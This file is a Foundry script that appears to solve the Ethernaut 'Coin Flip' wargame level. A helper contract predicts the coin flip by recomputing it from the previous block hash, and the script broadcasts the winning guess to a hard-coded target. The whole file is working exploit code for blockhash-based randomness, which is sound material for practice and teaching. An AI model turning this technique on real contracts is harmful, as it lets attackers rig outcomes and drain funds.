// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/3_Coin_Flip.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract POC is Script {

    CoinFlip public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = CoinFlip(0x9368E29848Cb781564D536C815De5fb90f08000B);
        new Player(target);
        console.log("consecutiveWins: ", target.consecutiveWins());
        vm.stopBroadcast();
    }
}